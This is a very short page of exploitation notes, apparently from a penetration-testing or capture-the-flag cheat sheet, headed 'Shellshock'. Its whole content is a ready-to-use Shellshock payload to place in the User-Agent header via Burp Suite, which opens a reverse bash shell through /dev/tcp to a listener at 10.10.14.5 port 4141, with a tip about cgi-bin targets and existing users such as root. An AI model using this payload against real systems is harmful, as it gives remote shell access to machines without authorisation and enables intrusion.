<h1>Vulnerabilities & exploitation</h1>


<h1>Shellshock</h1>

<h3>Burpsuite usage:</h3>

Use this payload in User-Agent to open a reverse shell to a netcat listener:
* () { :; };bash -i >& /dev/tcp/10.10.14.5/4141 0>&1 

- Note: You must have a target directory in cgi-bin and if you have credentials options, use an existing user. (root etc.)


